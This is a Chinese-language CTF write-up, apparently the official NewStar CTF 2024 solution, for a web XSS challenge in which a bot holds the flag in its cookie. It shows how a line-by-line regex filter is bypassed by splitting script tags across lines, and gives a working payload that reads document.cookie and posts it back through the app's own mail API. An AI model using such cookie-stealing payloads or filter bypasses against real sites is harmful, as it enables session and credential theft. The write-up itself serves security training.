# PangBai 过家家（5）

> 分类：Web

## 题目描述
XSS 题，有一个 Bot，flag 在 Bot 的 Cookie 中。题目有发信路由、查看信件路由，以及"提醒 PangBai"按钮（让 Bot 访问查看当前信件的路由）。需要找到一处能展示输入的地方，让浏览器执行恶意 JS 获取 Cookie。

## 考察知识点
- XSS（跨站脚本攻击）
- 正则过滤绕过（`m` 标志下按行匹配，把 `<`、`>` 放不同行）
- 无回显环境下用 fetch 模拟用户操作把 Cookie 写成一封信回显

## 解法
从 `bot.ts` 可见 FLAG 在 Cookie 中：
```typescript
await page.setCookie({
  name: "FLAG",
  value: process.env["FLAG"] || "flag{test_flag}",
  httpOnly: false, path: "/", domain: "localhost:3000", sameSite: "Strict",
});
```

后端 `page.ts` 的 `/box/:id` 路由用 `safe_html` 过滤输入：
```typescript
function safe_html(str: string) {
  return str
    .replace(/<.*>/gim, "")
    .replace(/<\.*>/gim, "")
    .replace(/<.*>.*<\/.*>/gim, "");
}
```
由于有 `m` 标志（多行匹配，按行匹配），只需把 `<` 和 `>` 放在不同行即可绕过：

```javascript
<script>alert(1)</script>
```

靶机不出网，用 JS 模拟用户操作，把 Cookie 作为信件内容提交，让 Bot 写信，再查看：

```javascript
<script
>
fetch('/api/send', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({'title': "Cookie", 'content': document.cookie})
})
</script
>
```

注意：Bot 访问的是 `http://localhost:3000`，因此请求路径用相对路径（`/api/send`）即可，不要用 `127.0.0.1` 以免跨域。

提交 payload 后点击"提醒 PangBai"，稍等后查看信箱即可看到 Cookie（flag）。

## 参考答案
（见截图）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/web/pangbai5.html
